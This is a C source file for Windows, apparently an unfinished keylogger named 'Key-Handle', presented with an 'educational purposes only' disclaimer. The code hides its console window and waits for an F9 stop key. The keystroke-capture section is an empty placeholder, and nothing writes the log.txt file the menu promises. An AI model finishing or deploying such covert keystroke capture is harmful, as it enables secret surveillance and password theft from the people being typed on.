#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#ifndef _BOOL_DEF_
    #define _BOOL_DEF_
    typedef int bool;
    #define false 0
    #define true 1
#endif

void renderMenu(); /* function prototype */

void clear() {
    system("cls");
}

void handleDirectory() {
    clear();
    puts("\nThis is still under construction...\n\nPress enter to return to the menu.");
    getchar();
    renderMenu();
}

void renderMenu() { 
    printf("\n[ Key-Handle ] - By alta\n\n"
        "Please read the following carefully...\n\n"
        "-------------------------------------------------------------------------------------\n"
        "Key-Handle is a simple key capturing program that runs hidden in the background\n"
        "and writes the keystrokes to a textfile in the directory the program was ran from.\n\n"
        "### DISCLAIMER: alta is not responsible for any malicious use of this software, ###\n"
        "###             it was made for educational purposes only.                      ###\n"
        "-------------------------------------------------------------------------------------\n\n"
        "Once capturing begins:\n"
        "You will hear 3 beeps, this console will be hidden and will capture all key strokes \n"
        "in the background. When you're done capturing, press the F9 key, you will hear a \n"
        "final beep to confirm everything closed successfully and the program will create \n"
        "a log.txt file summarising the monitoring session.\n\n"
        "Press enter to start capturing...%c", ' ');
    getchar();

}

int main(int argc, char* argv[]) {
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);

    bool showMenu = true;

    while(1) {
        if(showMenu) { 
            renderMenu(); 
            for (size_t i = 0; i < 3; i++) {
                MessageBeep(0xFFFFFF);
                Sleep(500);
            }
            ShowWindow(window,0);
            showMenu = false;
        }


        /* capture code */


        /* If the terminate key (F9) is pressed. */
        if (GetAsyncKeyState(VK_F9) & 0x8000) {
            MessageBeep(0xFFFFFF);
            ShowWindow(window, 1);
            puts("\n\n\n\n\n\n\n\nProgram has terminated, please check the log.txt file.\n"
                 "Press enter to close this terminal...@");
            getchar();
            break;
        }
    } /* End of main program loop */
    return EXIT_SUCCESS;
}